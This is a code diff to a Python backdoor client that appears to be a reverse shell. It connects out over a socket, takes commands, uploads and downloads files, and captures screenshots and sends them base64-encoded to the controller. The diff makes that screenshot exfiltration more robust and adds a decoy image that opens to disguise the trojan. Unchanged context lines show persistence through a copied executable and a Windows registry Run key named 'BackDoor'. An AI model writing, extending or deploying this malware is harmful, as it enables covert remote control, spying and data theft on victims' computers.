@@ -26,8 +26,9 @@ def reliable_recv():
             continue
 
 def screenshot():
-    with mss() as screenshot:
-        screenshot.shot()
+    with mss() as sct:
+        sct.shot(output='monitor-1.png')
+        print("[DEBUG] Screenshot saved.")
 
 def download(url):
     get_response = requests.get(url)
@@ -75,11 +76,14 @@ def shell():
         elif command[:10] == 'screenshot':
             try:
                 screenshot()
-                with open('monitor-1.png', 'rb') as sc:
-                    reliable_send(base64.b64encode(sc.read()))
-                os.remove('monitor-1.png')
-            except:
-                reliable_send('[!!] Failed To Capture Screenshot!')
+                if not os.path.exists('monitor-1.png') or os.path.getsize('monitor-1.png') == 0:
+                    reliable_send(base64.b64encode(b'[!!] Screenshot file is empty or missing').decode())
+                else:
+                    with open('monitor-1.png', 'rb') as sc:
+                        reliable_send(base64.b64encode(sc.read()).decode())
+                    os.remove('monitor-1.png')
+            except Exception as e:
+                reliable_send(base64.b64encode(f"[!!] Failed to capture screenshot: {e}".encode()).decode())
         elif command[:6] == 'upload':
             with open(command[7:], 'wb') as fin:
                 result = reliable_recv()
@@ -98,6 +102,11 @@ if not os.path.exists(location):
     shutil.copyfile(sys.executable, location)
     subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v BackDoor /t REG_SZ /d "' + location + '"', shell=True)
 
+    name = sys._MEIPATH + '\poa.jpg'
+    try:
+        subprocess.Popen(name, shell=True)
+    except:
+        pass
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
